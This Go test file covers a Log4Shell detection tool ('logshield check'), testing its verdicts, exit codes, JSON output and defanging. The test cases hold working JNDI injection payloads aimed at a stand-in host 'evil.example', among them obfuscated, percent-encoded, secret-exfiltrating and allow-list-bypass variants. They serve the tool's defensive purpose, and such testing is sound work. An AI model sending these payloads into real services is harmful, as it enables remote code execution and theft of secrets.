package main

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
)

// check runs "logshield check" and returns its exit code and output.
func check(t *testing.T, stdin string, args ...string) (code int, stdout, stderr string) {
	t.Helper()
	var out, errb bytes.Buffer
	code = runCheck(args, strings.NewReader(stdin), &out, &errb)
	return code, out.String(), errb.String()
}

func TestCheckVerdictsAndExitCodes(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		wantCode int
		want     []string // substrings of the text output
	}{
		{
			name:     "ordinary input is clean",
			args:     []string{"Mozilla/5.0 (X11; Linux x86_64)"},
			wantCode: checkExitClean,
			want:     []string{"verdict:  CLEAN", "would forward it"},
		},
		{
			name:     "plain JNDI lookup",
			args:     []string{"${jndi:ldap://evil.example/a}"},
			wantCode: checkExitMalicious,
			want:     []string{"MALICIOUS", "would BLOCK", "LSH-1001", "JNDI scheme: ldap", "CVE-2021-44228"},
		},
		{
			name:     "obfuscated lookup says how it was revealed",
			args:     []string{"${${lower:j}ndi:ldap://evil.example/a}"},
			wantCode: checkExitMalicious,
			want:     []string{"LSH-1002", "jndi-lookup-evasive"},
		},
		{
			name:     "percent-encoded payload in a query value",
			args:     []string{"-in", "query", "%24%7Bjndi:ldap://evil.example/a%7D"},
			wantCode: checkExitMalicious,
			want:     []string{"query parameter q", "revealed after decoding: percent"},
		},
		{
			name:     "path",
			args:     []string{"-in", "path", "%24%7Bjndi:ldap://evil.example/a%7D"},
			wantCode: checkExitMalicious,
			want:     []string{"placed:   path"},
		},
		{
			name:     "cookie with a custom name",
			args:     []string{"-in", "cookie", "-name", "session", "${jndi:ldap://evil.example/a}"},
			wantCode: checkExitMalicious,
			want:     []string{"cookie session"},
		},
		{
			name:     "body",
			args:     []string{"-in", "body", "${jndi:ldap://evil.example/a}"},
			wantCode: checkExitMalicious,
			want:     []string{"placed:   body"},
		},
		{
			name:     "suspicious is not blocked by default",
			args:     []string{"${env:HOME}"},
			wantCode: checkExitSuspicious,
			want:     []string{"SUSPICIOUS", "let it through", "LSH-2002"},
		},
		{
			name:     "suspicious is blocked in strict mode",
			args:     []string{"-block-suspicious", "${env:HOME}"},
			wantCode: checkExitSuspicious,
			want:     []string{"SUSPICIOUS", "would BLOCK"},
		},
		{
			name:     "key exfiltration lists what would leak",
			args:     []string{"${jndi:ldap://${env:SECRET}.evil.example/a}"},
			wantCode: checkExitMalicious,
			want:     []string{"LSH-1004", "would leak lookups"},
		},
		{
			name:     "host allow-list bypass",
			args:     []string{"${jndi:ldap://127.0.0.1#evil.example/a}"},
			wantCode: checkExitMalicious,
			want:     []string{"LSH-1005", "CVE-2021-45046"},
		},
		{
			name:     "a rule can be disabled as in the proxy",
			args:     []string{"-disable-rule", "LSH-2002", "${env:HOME}"},
			wantCode: checkExitClean,
			want:     []string{"CLEAN"},
		},
		{
			name:     "resource limits fail closed and say so",
			args:     []string{strings.Repeat("${", 400) + "x" + strings.Repeat("}", 400)},
			wantCode: checkExitMalicious,
			want:     []string{"analysis stopped at a resource limit", "LSH-3002"},
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			code, out, errs := check(t, "", tc.args...)
			if code != tc.wantCode {
				t.Fatalf("exit code = %d, want %d\nstdout:\n%s\nstderr:\n%s", code, tc.wantCode, out, errs)
			}
			for _, w := range tc.want {
				if !strings.Contains(out, w) {
					t.Errorf("output lacks %q:\n%s", w, out)
				}
			}
		})
	}
}

// The tool is for people who paste attack strings, often into a shell history,
// a ticket or a log. Nothing it prints may contain a live "${".
func TestCheckOutputIsDefanged(t *testing.T) {
	payload := "${${lower:j}ndi:ldap://${env:SECRET}.evil.example/a}"
	for _, args := range [][]string{{payload}, {"-json", payload}, {"-in", "query", payload}} {
		_, out, errs := check(t, "", args...)
		if strings.Contains(out, "${") || strings.Contains(errs, "${") {
			t.Errorf("args %q: output contains a live lookup:\n%s%s", args, out, errs)
		}
	}
}

func TestCheckReadsStandardInput(t *testing.T) {
	code, out, _ := check(t, "${jndi:ldap://evil.example/a}\n", "-")
	if code != checkExitMalicious {
		t.Fatalf("exit code = %d, want %d\n%s", code, checkExitMalicious, out)
	}
	// The trailing newline of echo is not part of the payload.
	if strings.Contains(out, "%0A") {
		t.Errorf("trailing newline was treated as payload:\n%s", out)
	}
	if code, _, errs := check(t, strings.Repeat("a", maxCheckInput+1), "-"); code != 2 || !strings.Contains(errs, "larger than") {
		t.Errorf("oversized input: code=%d stderr=%q", code, errs)
	}
}

func TestCheckJSON(t *testing.T) {
	code, out, _ := check(t, "", "-json", "${${lower:j}ndi:ldap://evil.example/a}")
	if code != checkExitMalicious {
		t.Fatalf("exit code = %d", code)
	}
	var rep map[string]any
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatalf("output is not JSON: %v\n%s", err, out)
	}
	for _, k := range []string{"input", "placed_in", "decision", "would_block_in_block_mode", "analysis_complete", "fields_inspected", "detections"} {
		if _, ok := rep[k]; !ok {
			t.Errorf("JSON lacks %q", k)
		}
	}
	if rep["decision"] != "malicious" || rep["would_block_in_block_mode"] != true {
		t.Errorf("decision = %v, would_block = %v", rep["decision"], rep["would_block_in_block_mode"])
	}
	dets, _ := rep["detections"].([]any)
	if len(dets) == 0 {
		t.Fatal("no detections in JSON")
	}
	first, _ := dets[0].(map[string]any)
	for _, k := range []string{"rule", "name", "severity", "location"} {
		if _, ok := first[k]; !ok {
			t.Errorf("detection lacks %q", k)
		}
	}

	// A clean result still has an empty list, not null, so consumers can range over it.
	_, out, _ = check(t, "", "-json", "hello")
	if !strings.Contains(out, `"detections": []`) {
		t.Errorf("clean result should have an empty detections array:\n%s", out)
	}
}

func TestCheckUsageErrors(t *testing.T) {
	tests := []struct {
		name string
		args []string
		want string
	}{
		{"no payload", nil, "expected exactly one PAYLOAD"},
		{"two payloads", []string{"a", "b"}, "expected exactly one PAYLOAD"},
		{"unknown place", []string{"-in", "elsewhere", "x"}, "unknown -in"},
		{"unknown flag", []string{"-nope", "x"}, "flag provided but not defined"},
		{"unknown rule", []string{"-disable-rule", "LSH-9999", "x"}, "unknown rule"},
		{"mandatory rule", []string{"-disable-rule", "LSH-3001", "x"}, "mandatory"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			code, out, errs := check(t, "", tc.args...)
			if code != 2 {
				t.Fatalf("exit code = %d, want 2", code)
			}
			if out != "" {
				t.Errorf("usage errors must not print a verdict: %q", out)
			}
			if !strings.Contains(errs, tc.want) {
				t.Errorf("stderr lacks %q:\n%s", tc.want, errs)
			}
		})
	}
	if code, _, _ := check(t, "", "-h"); code != 0 {
		t.Errorf("-h exit code = %d, want 0", code)
	}
}

// "check" is reached through the real entry point, so the proxy's own
// "-upstream is required" rule does not apply to it.
func TestRunDispatchesCheck(t *testing.T) {
	var out, errb bytes.Buffer
	code := run(t.Context(), []string{"check", "${jndi:ldap://evil.example/a}"}, &out, &errb, nil)
	if code != checkExitMalicious || !strings.Contains(out.String(), "LSH-1001") {
		t.Fatalf("code=%d\nstdout:\n%s\nstderr:\n%s", code, out.String(), errb.String())
	}
}
